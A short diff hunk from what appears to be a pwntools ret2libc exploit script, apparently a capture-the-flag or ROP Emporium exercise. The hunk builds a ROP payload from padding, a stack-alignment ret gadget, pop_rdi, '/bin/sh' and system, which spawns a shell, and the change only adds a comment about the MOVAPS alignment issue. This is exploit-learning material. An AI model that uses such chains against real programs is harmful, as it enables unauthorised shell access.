@@ -150,7 +150,7 @@ system   = p64(libc.symbols['system'])
 
 # Send the second ROP with the right offsets, system('/bin/sh')
 payload = b"A" * PADDING
-payload += ret # stack alignment
+payload += ret # stack alignment, The MOVAPS issue on https://ropemporium.com/guide.html
 payload += pop_rdi
 payload += bin_sh
 payload += system
